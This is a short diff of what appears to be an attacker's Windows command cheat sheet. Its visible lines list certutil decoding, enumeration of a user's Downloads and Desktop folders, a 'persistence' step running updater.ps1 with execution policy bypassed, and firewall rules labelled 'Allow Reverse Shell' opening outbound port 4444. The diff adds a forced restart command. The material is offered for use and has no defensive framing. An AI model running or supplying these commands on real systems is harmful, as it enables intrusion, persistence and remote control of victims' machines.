@@ -181,6 +181,8 @@ certutil -decode image.txt image.jpg
 powershell -Command "Get-ChildItem \"C:\\\""
 powershell -Command "Get-ChildItem \"C:\\Users\\$env:USERNAME\\Downloads\""
 powershell -Command "Get-ChildItem \"C:\\Users\\$env:USERNAME\\Desktop\""
+powershell -Command "Restart-Computer -Force"
+
 
 ///persistence Access (May try this ) 
 powershell -ExecutionPolicy Bypass -File "C:\Users\Public\updater.ps1"
@@ -190,6 +192,7 @@ New-NetFirewallRule -DisplayName "Allow Reverse Shell" -Direction Outbound -Prot
 Add-Content -Path "C:\Users\Public\log.txt" -Value "$(Get-Date): updater.ps1 triggered"
 netsh advfirewall firewall add rule name="Allow Reverse Shell" dir=out action=allow protocol=TCP remoteport=4444
 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+
 
 
 
